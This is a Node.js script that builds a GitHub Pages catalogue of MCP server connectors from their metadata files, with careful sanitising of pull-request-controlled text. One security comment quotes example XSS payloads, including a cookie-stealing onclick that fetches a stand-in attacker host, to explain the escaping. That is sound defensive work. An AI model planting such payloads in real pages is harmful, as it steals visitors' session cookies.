#!/usr/bin/env node
// Build the GitHub Pages catalogue under docs/catalogue/ from each connector's
// STATUS.json (preferred) or package.json + server.json (fallback). Read-only
// aggregator: writes only into docs/catalogue/ and docs/index.md.
//
// Usage:
//   node scripts/build-catalogue.mjs            # write to disk
//   node scripts/build-catalogue.mjs --check    # exit non-zero if outputs would change
//
// Inputs (per connector):
//   connectors/<name>/STATUS.json       (preferred)
//   connectors/<name>/package.json
//   connectors/<name>/server.json       (optional)
//   connectors/<name>/README.md         (tagline + positioning line extracted)
//
// Outputs:
//   docs/index.md                       (landing page + sortable table)
//   docs/catalogue/<name>.md            (per-connector page)
//   docs/_config.yml                    (Jekyll config; created if missing)

import { readFileSync, writeFileSync, existsSync, readdirSync, mkdirSync, statSync, unlinkSync } from 'node:fs';
import { join, resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

import { buildInstallLinks } from './lib/install-links.mjs';

const __dirname = dirname(fileURLToPath(import.meta.url));
const repoRoot = resolve(__dirname, '..');
const connectorsDir = join(repoRoot, 'connectors');
const docsDir = join(repoRoot, 'docs');
const catalogueDir = join(docsDir, 'catalogue');

const args = new Set(process.argv.slice(2));
const checkOnly = args.has('--check');

const REPO_URL = 'https://github.com/mindstone/mcp-servers';

function readJsonIfExists(path) {
  if (!existsSync(path)) return null;
  return JSON.parse(readFileSync(path, 'utf8'));
}

function readTextIfExists(path) {
  if (!existsSync(path)) return null;
  return readFileSync(path, 'utf8');
}

// Connectors deliberately omitted from the catalogue. Mirrors the
// exclusion list in .github/workflows/ci.yml::discover-connectors so the
// public site only advertises connectors that CI also validates.
const CATALOGUE_EXCLUSIONS = new Set(['_template', 'google-workspace']);

function listConnectors() {
  return readdirSync(connectorsDir)
    .filter((name) => !CATALOGUE_EXCLUSIONS.has(name))
    .filter((name) => statSync(join(connectorsDir, name)).isDirectory())
    .filter((name) => {
      if (CONNECTOR_SLUG_RE.test(name)) return true;
      console.error(
        `build-catalogue: refusing to render connector with non-slug name '${name}'. ` +
          `Names must match ${CONNECTOR_SLUG_RE.source}.`
      );
      process.exit(1);
    })
    .sort();
}

// Pull the one-line tagline (first non-empty paragraph after the H1) and
// the italic positioning line (if present) from a connector README.
function extractTaglineAndPositioning(readmePath) {
  const text = readTextIfExists(readmePath);
  if (!text) return { tagline: null, positioning: null };
  const lines = text.split(/\r?\n/);
  let i = 0;
  while (i < lines.length && !lines[i].startsWith('# ')) i++;
  if (i >= lines.length) return { tagline: null, positioning: null };
  i++;
  // Skip blank lines and any badge / image lines starting with [![ or ![.
  while (
    i < lines.length &&
    (lines[i].trim() === '' ||
      lines[i].trim().startsWith('[![') ||
      lines[i].trim().startsWith('![') ||
      lines[i].trim().startsWith('<!--'))
  ) {
    i++;
  }
  const tagline = lines[i]?.trim() || null;
  i++;
  while (i < lines.length && lines[i].trim() === '') i++;
  const candidate = lines[i]?.trim() || '';
  const positioning =
    candidate.startsWith('*') && candidate.endsWith('*') && !candidate.startsWith('**')
      ? candidate.replace(/^\*|\*$/g, '').trim()
      : null;
  return { tagline, positioning };
}

function buildConnectorInfo(name) {
  const dir = join(connectorsDir, name);
  const status = readJsonIfExists(join(dir, 'STATUS.json'));
  const pkg = readJsonIfExists(join(dir, 'package.json'));
  const server = readJsonIfExists(join(dir, 'server.json'));
  const { tagline, positioning } = extractTaglineAndPositioning(join(dir, 'README.md'));

  const envVars = server?.packages?.[0]?.environmentVariables ?? [];
  const secretEnvNames = envVars.filter((e) => e.isSecret || /KEY|TOKEN|SECRET/.test(e.name)).map((e) => e.name);

  // Derive one-click install URLs from server.json. We swallow malformed
  // input here (return null) instead of failing the catalogue build, because
  // the catalogue is rendered on every push and a single bad connector
  // shouldn't block the site refresh — the install-links --check job in
  // ci.yml will fail the PR loudly on the same input.
  let installLinks = null;
  if (server) {
    try {
      installLinks = buildInstallLinks(name, server);
    } catch (err) {
      console.error(`build-catalogue: install-links for ${name} skipped: ${err.message}`);
    }
  }

  return {
    name,
    package: status?.package ?? pkg?.name ?? null,
    version: status?.version ?? pkg?.version ?? null,
    description: pkg?.description ?? null,
    tagline,
    positioning,
    auth: status?.auth ?? { type: 'unknown', envVars: secretEnvNames },
    tools: status?.tools ?? { count: null, domains: [] },
    surface: status?.surface ?? null,
    hostsTested: status?.hostsTested ?? null,
    evidence: status?.evidence ?? null,
    lastVerifiedAgainstApi: status?.lastVerifiedAgainstApi ?? null,
    hasStatus: !!status,
    npmUrl: pkg?.name ? `https://www.npmjs.com/package/${pkg.name}` : null,
    serverJsonUrl: existsSync(join(dir, 'server.json'))
      ? `${REPO_URL}/blob/main/connectors/${name}/server.json`
      : null,
    statusJsonUrl: status ? `${REPO_URL}/blob/main/connectors/${name}/STATUS.json` : null,
    sourceUrl: `${REPO_URL}/tree/main/connectors/${name}`,
    readmeUrl: `${REPO_URL}/blob/main/connectors/${name}/README.md`,
    installLinks,
  };
}

const HOST_LABELS = {
  'claude-desktop': 'Claude Desktop',
  cursor: 'Cursor',
  'mindstone-rebel': 'Mindstone Rebel',
  windsurf: 'Windsurf',
  vscode: 'VS Code',
  raycast: 'Raycast',
};

const AUTH_LABELS = {
  'api-key': 'API key',
  'basic-auth': 'Basic auth',
  'oauth-host-orchestrated': 'OAuth (host-orchestrated)',
  'oauth-local-callback': 'OAuth (local 127.0.0.1 callback)',
  'oauth-client-credentials': 'OAuth (client credentials)',
  oauth: 'OAuth',
  none: 'None',
  hybrid: 'Hybrid',
  unknown: 'Unknown',
};

const SURFACE_LABELS = {
  'cloud-api': 'cloud API',
  'desktop-addin': 'desktop add-in',
  'local-cli': 'local CLI',
  'browser-automation': 'browser automation',
  'local-protocol': 'local protocol',
  TBD: 'TBD',
};

// SECURITY: anything in this file that is reachable from a connector PR
// is PR-controlled input. After kramdown renders the page, a malicious
// Markdown link like `[click](javascript:alert(document.cookie))`, an
// inline `<script>` tag, or a kramdown Inline Attribute List such as
// `text{:onclick="fetch('https://attacker/'+document.cookie)"}` would
// execute in any visitor's browser. We do NOT rely on Jekyll's
// `safe: true` for this — that flag is about plugin loading, not
// link-scheme filtering.
//
// The full list of PR-controlled values rendered by this script:
//   - tagline                  (README first paragraph)
//   - positioning              (italic line after the tagline)
//   - description              (package.json fallback for tagline)
//   - tools.domains[]          (STATUS.json)
//   - hostsTested[]            (when not in HOST_LABELS)
//   - auth.type                (when not in AUTH_LABELS)
//   - auth.envVars[]           (server.json — typed by registry validator)
//   - surface                  (when not in SURFACE_LABELS)
//   - name, package, version   (package.json / STATUS.json identifiers)
//   - evidence.{changelog,tools,auth,tests} (STATUS.json paths)
//
// sanitise() HTML-entity-escapes every character that kramdown uses for
// syntax, AND collapses all whitespace into single spaces so a JSON value
// with embedded `\n` cannot create a new Markdown block (closing a table
// row, starting an unrelated paragraph, or attaching a kramdown IAL block):
//   `&` (must come first so the other escapes aren't double-encoded)
//   `<`, `>`                  (HTML tags / autolinks)
//   `[`, `]`                  (link / reference syntax)
//   `(`, `)`                  (inline link URL delimiter)
//   `{`, `}`                  (kramdown IAL/BAL attribute lists)
//   `` ` ``                   (inline-code span; protects backtick-wrapped contexts)
//   `|`                       (table-cell separator)
//   any \s+                   collapsed to a single space (one-line invariant)
//
// Trade-off: an intentional Markdown link inside a tagline (e.g. browser-
// automation's '[agent-browser](https://npmjs.com/...)') renders as literal
// text rather than a clickable link. That is the deliberate cost of refusing
// to parse any link from a PR-controlled value. Visitors can click through
// to the connector's README to follow the real link.
//
// We use numeric HTML entities (&#NN;) rather than named entities for the
// bracket / paren / brace chars because kramdown processes named entities
// in some inline contexts, while &#NN; passes through unchanged into the
// rendered HTML and is decoded back to the visible character by the
// browser at display time — after kramdown's link-parsing phase has
// already finished.
//
// Reference: https://owasp.org/www-community/attacks/xss/
const ENTITY_MAP = {
  '&': '&amp;',
  '<': '&lt;',
  '>': '&gt;',
  '[': '&#91;',
  ']': '&#93;',
  '(': '&#40;',
  ')': '&#41;',
  '{': '&#123;',
  '}': '&#125;',
  '`': '&#96;',
};

function sanitise(text) {
  if (text === null || text === undefined) return null;
  return String(text)
    .replace(/[&<>\[\](){}`]/g, (c) => ENTITY_MAP[c])
    .replace(/\|/g, '\\|')
    .replace(/\s+/g, ' ')
    .trim();
}

// URL-encode a path fragment for use as part of an http(s) URL. PR-controlled
// values (e.g. STATUS.json's evidence paths) flow through here before being
// embedded in a Markdown link target so the URL parser cannot be tricked into
// closing the parenthetical early or attaching a query string. Path separators
// are deliberately preserved because evidence values are file paths.
function encodeUrlPath(text) {
  if (text === null || text === undefined) return '';
  return String(text)
    .split('/')
    .map((seg) => encodeURIComponent(seg))
    .join('/');
}

// Connector directory names — independent slug guard so build-catalogue.mjs
// does not depend on the ci.yml discover step for safety. Mirrors the
// regex in .github/workflows/ci.yml::discover-connectors and
// .github/workflows/changelog-check.yml.
const CONNECTOR_SLUG_RE = /^[a-z0-9][a-z0-9-]*$/;

// Env var identifiers — uppercase letters, digits, underscores. Mirrors
// the convention enforced by the MCP registry server.json validator.
const ENV_VAR_RE = /^[A-Z][A-Z0-9_]*$/;

// SemVer-ish — accept anything check-status.mjs would accept as a version
// (which currently is strict equality across package.json, server.json,
// and STATUS.json; we additionally reject anything with whitespace or
// table-control characters). This is paranoia, not validation.
const SEMVER_LIKE_RE = /^[A-Za-z0-9.+\-_]+$/;

function formatHosts(hosts) {
  if (!hosts || hosts.length === 0) return '—';
  return hosts.map((h) => HOST_LABELS[h] ?? sanitise(h)).join(', ');
}

function formatAuth(auth) {
  if (!auth || !auth.type) return '—';
  return AUTH_LABELS[auth.type] ?? sanitise(auth.type);
}

function formatSurface(surface) {
  if (!surface) return '—';
  return SURFACE_LABELS[surface] ?? sanitise(surface);
}

function indexPage(connectors) {
  const rows = connectors
    .map((c) => {
      // c.name is slug-validated by listConnectors() in this file (not just
      // by ci.yml::discover-connectors — the catalogue defends itself).
      const link = `[${c.name}](./catalogue/${c.name}.html)`;
      const auth = formatAuth(c.auth);
      // tools.count is checked === actual count by check-status.mjs, so the
      // value is structurally a number. Coerce defensively.
      const tools = Number.isInteger(c.tools?.count) ? c.tools.count : '—';
      const surface = formatSurface(c.surface);
      const version = SEMVER_LIKE_RE.test(String(c.version)) ? c.version : '—';
      const tagline = sanitise(c.tagline ?? c.description) || '—';
      return `| ${link} | ${tagline} | ${version} | ${auth} | ${tools} | ${surface} |`;
    })
    .join('\n');

  return `---
layout: default
title: mcp-servers catalogue
---

# mcp-servers catalogue

A machine-readable index of the [mindstone/mcp-servers](${REPO_URL}) monorepo: ${connectors.length} source-available MCP servers, audited weekly by the [OpenSSF Scorecard](https://scorecard.dev/viewer/?uri=github.com/mindstone/mcp-servers).

Each row links to a per-connector page generated from the connector's \`STATUS.json\`. The data on this site is derived from the source repository on every push to \`main\` — if it looks stale, the data isn't.

| Connector | What it does | Version | Auth | Tools | Surface |
|-----------|--------------|---------|------|-------|---------|
${rows}

## How this catalogue is built

- The source of truth for each row is \`connectors/<name>/STATUS.json\` in the repo. The file is validated by \`scripts/check-status.mjs\` on every PR.
- This page is regenerated from those JSON files by \`scripts/build-catalogue.mjs\` and published via GitHub Pages. The generator is read-only — it never modifies a connector directory.
- Connectors without a \`STATUS.json\` yet are listed with derived data from \`package.json\` and \`server.json\`; their per-connector pages are marked \`status: pending\`.

## See also

- [Repository on GitHub](${REPO_URL})
- [Security policy](${REPO_URL}/blob/main/SECURITY.md)
- [Migration guide for the \`@mindstone-engineering/\` → \`@mindstone/\` scope change](${REPO_URL}/blob/main/MIGRATION.md)
- [Connector README guide](${REPO_URL}/blob/main/docs/CONNECTOR_README_GUIDE.md)
`;
}

// Allowed shape for evidence.* paths in STATUS.json. Restricts to
// repo-relative segments: letters, digits, dot, hyphen, underscore,
// forward slash. This is a defence-in-depth check at render time;
// scripts/check-status.mjs should also validate this in a follow-up so
// the failure surfaces at PR time rather than at catalogue render.
const EVIDENCE_PATH_RE = /^[A-Za-z0-9_.\/-]+$/;

// Build a Markdown link row for the Evidence table. Both the visible
// label and the URL fragment derive from STATUS.json (PR-controlled).
// The label is rendered inside a backtick code-span AFTER asserting the
// path matches EVIDENCE_PATH_RE (no Markdown syntax characters can
// survive); the URL fragment is URL-encoded segment-by-segment so a
// malicious path cannot close the parenthetical early.
function evidenceLinkRow(label, repoRelativePath) {
  const cleanPath = String(repoRelativePath).replace(/^\.\//, '');
  if (!EVIDENCE_PATH_RE.test(cleanPath)) {
    // Refuse to render rather than risk a kramdown escape via a hostile path.
    // The label still renders so the row's absence is visible.
    return `| ${label} | — (evidence path rejected) |`;
  }
  const urlPath = encodeUrlPath(cleanPath);
  return `| ${label} | [\`${cleanPath}\`](${REPO_URL}/tree/main/${urlPath}) |`;
}

function connectorPage(c) {
  // c.name is slug-validated by listConnectors() before reaching here.
  const baseRepoPath = `connectors/${c.name}`;

  const evidenceRows = [];
  if (c.evidence?.changelog) {
    evidenceRows.push(
      `| Changelog | [\`CHANGELOG.md\`](${REPO_URL}/blob/main/${baseRepoPath}/CHANGELOG.md) |`
    );
  }
  if (c.evidence?.tools) {
    evidenceRows.push(
      evidenceLinkRow('Tools source', `${baseRepoPath}/${String(c.evidence.tools).replace(/^\.\//, '')}`)
    );
  }
  if (c.evidence?.tests) {
    evidenceRows.push(
      evidenceLinkRow('Tests', `${baseRepoPath}/${String(c.evidence.tests).replace(/^\.\//, '')}`)
    );
  }
  if (c.statusJsonUrl) {
    evidenceRows.push(`| Machine-readable status | [\`STATUS.json\`](${c.statusJsonUrl}) |`);
  }
  if (c.serverJsonUrl) {
    evidenceRows.push(`| MCP server manifest | [\`server.json\`](${c.serverJsonUrl}) |`);
  }
  if (c.npmUrl && c.package) {
    // c.package is sanitise()d for the link label — it's a registered npm
    // scope name (already constrained by `npm publish`) but defence-in-depth.
    const displayPackage = sanitise(c.package);
    evidenceRows.push(`| npm package | [${displayPackage}](${c.npmUrl}) |`);
  }
  evidenceRows.push(`| Source directory | [\`${baseRepoPath}/\`](${c.sourceUrl}) |`);
  evidenceRows.push(`| README | [\`README.md\`](${c.readmeUrl}) |`);

  // Env-var names: validate against the registry-style identifier regex and
  // silently drop any name that fails. A malformed env var name is a CI
  // bug, not a display problem — server-json-check.yml will fail the PR
  // separately on the same input.
  const authEnvVars =
    (c.auth?.envVars ?? [])
      .filter((n) => typeof n === 'string' && ENV_VAR_RE.test(n))
      .map((n) => `\`${n}\``)
      .join(', ') || '—';
  const domains = c.tools?.domains?.length
    ? c.tools.domains
        .map(sanitise)
        .filter((v) => v && v.length > 0)
        .join(', ')
    : '—';

  const pendingNotice = c.hasStatus
    ? ''
    : `\n> **Status: pending.** This connector does not yet have a \`STATUS.json\`. The values below are derived from \`package.json\` and \`server.json\` and have not been editorially reviewed.\n`;

  const tagline = sanitise(c.tagline ?? c.description) || '';
  const positioning = sanitise(c.positioning);
  const version = SEMVER_LIKE_RE.test(String(c.version)) ? c.version : '—';
  const toolCount = Number.isInteger(c.tools?.count) ? c.tools.count : '—';

  // Install section. When server.json is present we render one-click install
  // buttons (Cursor / VS Code / VS Code Insiders) plus the npx fallback. The
  // URLs come from buildInstallLinks() in scripts/lib/install-links.mjs, which
  // strict-validates every PR-controlled value before letting it into a URL,
  // so we can embed the URLs directly into Markdown link targets here without
  // the sanitise() pass we use for table cells. The shields.io badge URLs are
  // hard-coded constants — no external value flows into them.
  const installBlock = (() => {
    if (c.installLinks) {
      const { cursorUrl, vscodeUrl, vscodeInsidersUrl } = c.installLinks;
      const cursorBadge =
        'https://img.shields.io/badge/Add_to_Cursor-black?style=for-the-badge&logo=cursor&logoColor=white';
      const vscodeBadge =
        'https://img.shields.io/badge/Add_to_VS_Code-007ACC?style=for-the-badge&logo=visual-studio-code&logoColor=white';
      const vscodeInsidersBadge =
        'https://img.shields.io/badge/Add_to_VS_Code_Insiders-24bfa5?style=for-the-badge&logo=visual-studio-code&logoColor=white';
      const npxLine =
        c.package && typeof c.package === 'string' && c.package.length > 0
          ? `Or via npx:\n\n\`\`\`bash\nnpx -y ${c.package}\n\`\`\``
          : `_See the [README](${c.readmeUrl}) for npx-based install instructions._`;
      return [
        `[![Add to Cursor](${cursorBadge})](${cursorUrl})`,
        `[![Add to VS Code](${vscodeBadge})](${vscodeUrl})`,
        `[![Add to VS Code Insiders](${vscodeInsidersBadge})](${vscodeInsidersUrl})`,
        '',
        npxLine,
        '',
        `See the [README](${c.readmeUrl}) for full setup, environment variables, and host-specific examples.`,
      ].join('\n');
    }
    return c.package && typeof c.package === 'string' && c.package.length > 0
      ? `\`\`\`bash\nnpx -y ${c.package}\n\`\`\`\n\nAdd to your MCP host configuration; see the [README](${c.readmeUrl}) for full setup, environment variables, and host-specific examples.`
      : `_Package name not yet set in_ \`package.json\`_. See the [README](${c.readmeUrl}) for install instructions._`;
  })();

  return `---
layout: default
title: ${c.name} — mcp-servers catalogue
---

# ${c.name}

${tagline}

${positioning ? `*${positioning}*` : ''}
${pendingNotice}
## Status

| Field | Value |
|-------|-------|
| Version | ${version} |
| Auth | ${formatAuth(c.auth)} (${authEnvVars}) |
| Tools | ${toolCount} (${domains}) |
| Surface | ${formatSurface(c.surface)} |
| Hosts tested | ${formatHosts(c.hostsTested)} |

## Evidence

| Artefact | Location |
|----------|----------|
${evidenceRows.join('\n')}

## Install

${installBlock}

## Back to catalogue

[← All connectors](../)
`;
}

// NOTE: docs/_config.yml is intentionally NOT regenerated by this script.
// The Jekyll config controls which paths get published, and it is a
// human-review surface — weakening the allowlist must be visible in a PR
// diff, not buried inside a generator template. If you need to change
// Jekyll settings, edit docs/_config.yml directly.

function ensureDir(p) {
  if (!existsSync(p)) mkdirSync(p, { recursive: true });
}

function readIfExists(p) {
  return existsSync(p) ? readFileSync(p, 'utf8') : null;
}

function writeIfChanged(path, content) {
  const existing = readIfExists(path);
  if (existing === content) return false;
  if (checkOnly) {
    console.error(`drift: ${path}`);
    return true;
  }
  ensureDir(dirname(path));
  writeFileSync(path, content);
  return true;
}

const connectors = listConnectors().map(buildConnectorInfo);

let drifted = false;

// Hard requirement: the Jekyll config must exist on disk. We don't write
// it (per the note above) but we do require it to be present, because
// without it Pages would publish docs/ wholesale.
const configPath = join(docsDir, '_config.yml');
if (!existsSync(configPath)) {
  console.error(
    `build-catalogue: ${configPath} is missing. ` +
      `This file is required and is intentionally NOT regenerated by this script — ` +
      `add it by hand (see the canonical version in git history).`
  );
  process.exit(1);
}

drifted = writeIfChanged(join(docsDir, 'index.md'), indexPage(connectors)) || drifted;
ensureDir(catalogueDir);

// Track files we own so we can prune stale per-connector pages. We do NOT
// own _config.yml.
const owned = new Set([join(docsDir, 'index.md')]);

for (const c of connectors) {
  const out = join(catalogueDir, `${c.name}.md`);
  owned.add(out);
  drifted = writeIfChanged(out, connectorPage(c)) || drifted;
}

// Remove stale catalogue files (e.g. a removed connector). Only touch files
// directly inside docs/catalogue/.
if (existsSync(catalogueDir)) {
  for (const entry of readdirSync(catalogueDir)) {
    const full = join(catalogueDir, entry);
    if (!owned.has(full) && entry.endsWith('.md')) {
      if (checkOnly) {
        console.error(`drift: stale ${full}`);
        drifted = true;
      } else {
        unlinkSync(full);
      }
    }
  }
}

if (checkOnly && drifted) {
  console.error('build-catalogue: catalogue is out of date; run `node scripts/build-catalogue.mjs`');
  process.exit(1);
}

console.log(`build-catalogue: wrote catalogue for ${connectors.length} connectors`);
